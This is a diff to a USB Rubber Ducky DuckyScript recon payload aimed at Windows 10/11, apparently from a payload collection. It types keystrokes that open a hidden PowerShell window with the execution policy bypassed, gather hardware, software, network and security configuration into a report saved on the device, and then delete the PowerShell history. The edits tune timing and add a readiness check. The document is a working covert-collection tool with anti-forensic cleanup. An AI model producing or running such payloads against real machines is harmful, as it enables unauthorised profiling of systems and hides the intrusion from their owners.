@@ -6,18 +6,23 @@ REM                Collects hardware, software, network,
 REM                and security configuration details.
 REM                Saves report to Ducky mass storage.
 REM Target:        Windows 10/11
-REM Version:       1.0
+REM Version:       1.1
 REM Category:      Recon
 REM ====================================================
 
 DEFINE #LABEL DUCKY
 
-DELAY 1000
+REM Use PASSIVE_WINDOWS_DETECT for reliable keystroke timing
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM The extension will wait until the target is ready
+    REM to accept keystrokes before continuing
+END_EXTENSION
+
 REM Open PowerShell hidden
 GUI r
-DELAY 500
+DELAY 300
 STRINGLN powershell -ExecutionPolicy Bypass -WindowStyle Hidden
-DELAY 1500
+DELAY 1000
 
 REM Find the Ducky drive
 STRINGLN $d=(Get-CimInstance Win32_LogicalDisk|?{$_.VolumeName -eq '#LABEL'}).DeviceID;if(!$d){$d=$env:TEMP}
@@ -109,6 +114,8 @@ DELAY 100
 STRINGLN $r -join "`n"|Out-File "$d\system_profile_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt" -Encoding UTF8
 DELAY 500
 
-REM Clean up
-REM WARNING: The following line deletes ALL PowerShell history. Comment out if not desired.
-STRINGLN Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue;exit
+REM WARNING: The following line deletes ALL PowerShell history.
+REM Comment out if you want to preserve command history.
+STRINGLN Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
+
+STRINGLN exit
